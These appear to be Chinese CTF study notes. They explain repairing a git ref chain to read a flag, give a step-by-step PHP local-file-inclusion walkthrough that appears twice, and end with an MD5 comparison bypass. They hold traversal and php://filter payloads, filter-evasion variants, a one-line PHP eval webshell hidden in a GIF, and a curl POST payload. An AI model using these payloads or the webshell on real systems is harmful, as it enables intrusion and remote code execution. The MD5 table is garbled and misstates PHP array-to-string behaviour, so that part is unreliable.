Git 的“引用链”就像一条**从大门到仓库的路线图**——任何一环断了，Git 就拒绝进门，更不会帮你搬货（读文件）。下面用“找 flag”这个故事串一遍整条链，并指出**你之前缺的是哪一环**。

---

### 1️⃣ 大门牌：HEAD

- 作用：告诉 Git“我现在站在哪个分支门口”。
- 内容示例：
  ```
  ref: refs/heads/master
  ```
- **缺了它** → Git 不知道先迈哪条腿，直接 `fatal: not a git repository`。

---

### 2️⃣ 路口指示牌：refs/heads/<branch>

- 实质：一个普通文本文件，里面只写**一个 SHA-1**。
- 示例（文件 `.git/refs/heads/master`）：
  ```
  5495f65c88f7e8b75a3a58682a4114929bddb10a
  ```
- **缺了它** → 路口牌子被拔了，Git 站在门口找不到下一步，同样退出。
  → **你之前就是这里断了**！

---

### 3️⃣ 仓库房间号：commit 对象

- SHA 指向的对象必须是 **commit 类型**（或至少是可解析的 tree/blob）。
- commit 里再指向 tree → tree 指向 blob → 最终拿到文件内容。
- **缺了/commit 指向错误** → `fatal: Could not parse object 'HEAD'`。

---

### 4️⃣ 整条链完整时

```
HEAD
  ↓  ref:
refs/heads/master
  ↓  SHA:
commit-object
  ↓  tree:
tree-object
  ↓  blob:
flag.txt 内容
```

---

### 5️⃣ 你手动修复的其实就是第 2 环

```bash
mkdir -p .git/refs/heads
echo 5495f65c88f7e8b75a3a58682a4114929bddb10a > .git/refs/heads/master
```

→ 把“路口指示牌”重新立起来，Git 就能顺着牌子走到 blob，**不用管有没有 commit/tree**（你指哪它就解析哪）。

---

### 一句话记忆

“HEAD 给方向，refs 给门牌，对象给内容”——**门牌被拔了，Git 就罢工；把门牌插回去，路就通了。





//////////////////////////////////////////////////////////////////////



下面把“这题”拆成一条一条**可复现的思路**，你只要按顺序往下试，就能自己打出 flag。整套方法论不仅适用于本题，也适用于所有“明显存在文件包含入口”的 CTF Web 题。

---

1. 先找“输入点”

   - 页面里有一个表单／GET 参数／POST 参数，让你“提交食材名”“选择模板”“language=”之类——**凡是你能控制字符串、最后又出现在返回包里的，都是潜在输入点**。
   - 本题输入点就是提示里的
     “请输入食材名（如 food1.webp）”。
2. 用“正常值”探路

   - 先按它给的例子输：`food1.webp`
     目的：看系统怎么回显、报错，确认后端真的在“包含/读取”你给的文件。
   - 本题回显了
     `Warning: Unexpected character ... in /var/www/html/backpack/food1.webp on line 618`
     关键信息：
     – 完整路径被拼出来 → 知道工作目录是 `/var/www/html/backpack/`
     – PHP 把它当 PHP 解析 → 说明用的是 `include/require` 这类函数
     这两条信息已经足够断定“存在文件包含”。
3. 判断过滤
   把下面几种字符分别单独测试，看会不会被拦截或转义：
   `../  ..\  ..  /  \  %2f  %5c  ..%2f  ..%5c`
   如果都能原样出现在报错路径里，就证明**没有过滤**，可以直接目录遍历。
4. 计算“跳几层”到根
   已知工作目录：
   `/var/www/html/backpack/`
   想读到根目录下的 `/flag.txt`，需要向上跳 3 层就到 `/`：
   `backpack/` → `html/` → `www/` → `/`
   所以用 3 个 `../` 即可；为了保险可以多写一个（`../../../../flag.txt`），反正到了根以后再 `../` 还是根。
5. 第一次 payload

   ```
   ../../../../flag.txt
   ```

   提交后如果页面直接回显
   `恭喜！你领悟了魔物饭的美味之处，这是你的奖励 flag{…}`
   那就结束战斗。
   如果返回空白、报错、或提示“文件不存在”，继续下一步。
6. 换“PHP 过滤器”读源码
   后端有可能把 `.txt` 当成 PHP 执行，结果空白；这时用伪协议让它只读不执行：

   ```
   php://filter/read=convert.base64-encode/resource=../../../../flag.txt
   ```

   你会得到一串 Base64，解码即可看到 flag。
   （这个技巧同样适用于读 `.php` 源码，比如想看他到底怎么 include 的。）
7. 如果过滤了关键字
   – 过滤 `../` → 用双写 `....//` 或 URL 编码 `..%2f..%2f`
   – 过滤 `flag` → 用通配符 `fla?` 或 `fl*`（部分系统支持）
   – 过滤 `php://` → 尝试 data://、input://，或者短标签 `pHp://` 大小写绕过
   总之**它过滤什么，就针对什么做变形**，直到路径能出现回显。
8. 进阶：把“读文件”升级成“RCE”
   如果题目允许上传（比如再给你一处“上传头像”功能），可以：

   1. 传一张带 PHP 码的图片马：
      `GIF89a<?=@eval($_POST[x]);?>`
   2. 用刚才的包含点去 `include` 这个图片：
      `../../../../upload/2023xxx/shell.gif`
   3. 拿到 WebShell，想读什么读什么，甚至 cat /root/flag.txt。

---

一句话总结思路
“先找输入→探路径→测过滤→目录遍历到根→伪协议兜底→上传就升 RCE”。

把这条流水线背下来，再遇到“包含类” Web 题，5 分钟就能自己打出 flag。祝你下一次秒出题！

**

下面把“这题”拆成一条一条**可复现的思路**，你只要按顺序往下试，就能自己打出 flag。整套方法论不仅适用于本题，也适用于所有“明显存在文件包含入口”的 CTF Web 题。

---

1. 先找“输入点”

   - 页面里有一个表单／GET 参数／POST 参数，让你“提交食材名”“选择模板”“language=”之类——**凡是你能控制字符串、最后又出现在返回包里的，都是潜在输入点**。
   - 本题输入点就是提示里的
     “请输入食材名（如 food1.webp）”。
2. 用“正常值”探路

   - 先按它给的例子输：`food1.webp`
     目的：看系统怎么回显、报错，确认后端真的在“包含/读取”你给的文件。
   - 本题回显了
     `Warning: Unexpected character ... in /var/www/html/backpack/food1.webp on line 618`
     关键信息：
     – 完整路径被拼出来 → 知道工作目录是 `/var/www/html/backpack/`
     – PHP 把它当 PHP 解析 → 说明用的是 `include/require` 这类函数
     这两条信息已经足够断定“存在文件包含”。
3. 判断过滤
   把下面几种字符分别单独测试，看会不会被拦截或转义：
   `../  ..\  ..  /  \  %2f  %5c  ..%2f  ..%5c`
   如果都能原样出现在报错路径里，就证明**没有过滤**，可以直接目录遍历。
4. 计算“跳几层”到根
   已知工作目录：
   `/var/www/html/backpack/`
   想读到根目录下的 `/flag.txt`，需要向上跳 3 层就到 `/`：
   `backpack/` → `html/` → `www/` → `/`
   所以用 3 个 `../` 即可；为了保险可以多写一个（`../../../../flag.txt`），反正到了根以后再 `../` 还是根。
5. 第一次 payload

   ```
   ../../../../flag.txt
   ```

   提交后如果页面直接回显
   `恭喜！你领悟了魔物饭的美味之处，这是你的奖励 flag{…}`
   那就结束战斗。
   如果返回空白、报错、或提示“文件不存在”，继续下一步。
6. 换“PHP 过滤器”读源码
   后端有可能把 `.txt` 当成 PHP 执行，结果空白；这时用伪协议让它只读不执行：

   ```
   php://filter/read=convert.base64-encode/resource=../../../../flag.txt
   ```

   你会得到一串 Base64，解码即可看到 flag。
   （这个技巧同样适用于读 `.php` 源码，比如想看他到底怎么 include 的。）
7. 如果过滤了关键字
   – 过滤 `../` → 用双写 `....//` 或 URL 编码 `..%2f..%2f`
   – 过滤 `flag` → 用通配符 `fla?` 或 `fl*`（部分系统支持）
   – 过滤 `php://` → 尝试 data://、input://，或者短标签 `pHp://` 大小写绕过
   总之**它过滤什么，就针对什么做变形**，直到路径能出现回显。
8. 进阶：把“读文件”升级成“RCE”
   如果题目允许上传（比如再给你一处“上传头像”功能），可以：

   1. 传一张带 PHP 码的图片马：
      `GIF89a<?=@eval($_POST[x]);?>`
   2. 用刚才的包含点去 `include` 这个图片：
      `../../../../upload/2023xxx/shell.gif`
   3. 拿到 WebShell，想读什么读什么，甚至 cat /root/flag.txt。

---

一句话总结思路
“先找输入→探路径→测过滤→目录遍历到根→伪协议兜底→上传就升 RCE”。

把这条流水线背下来，再遇到“包含类” Web 题，5 分钟就能自己打出 flag。祝你下一次秒出题！


**“看到 Parse error，就等于 PHP 已经开机解析。”**
再配合路径被完整拼出来，就能瞬间判定：
→ 后端在用 `include`/`require`（或 `include_once`/`require_once`）
→ 存在本地文件包含（LFI）漏洞。




/////////////////////////////////////////////////////////////////////////////


### 三重 MD5 闯关要求

**表格**复制


| 关卡 | 比较运算符                                                                             | 要求（必须同时满足）                                                                                                  |
| :--- | :------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------- |
| 1    | `md5($a) == md5($b)`                                                                   | ①`$a !== $b`（值或类型至少有一项不同）<br/>② 弱比较相等 → 用“0e 科学计数法”即可                                  |
| 2    | `md5((string)$a) === md5((string)$b)`                                                  | ①`$a !== $b`<br/>② 强比较相等 → **数组 trick**：`md5((string)数组)` 返回 **NULL**，两个 NULL 恒等                  |
| 3    | `md5((string)$a) === md5((string)$b)` 且 **(string)**a**!**==**(**s**t**r**in**g**)b** | ① 摘要强相等<br/>② 字符串形式**必须不相等** → 继续用**数组 trick**，但让 `(string)$a` 与 `(string)$b` 长度不同即可 |

---

### 现成 payload（一键通）

**bash**复制

```bash
curl -X POST \
  -d 'a=QNKCDZO&b=s878926199a&aa[]=1&bb[]=2&aaa[0][0]=1&bbb[1]=2' \
  http://靶机IP/index.php
```

解释：

* 第一关：0e 弱相等 ✅
* 第二关：两个空数组转 NULL 强相等 ✅
* 第三关：
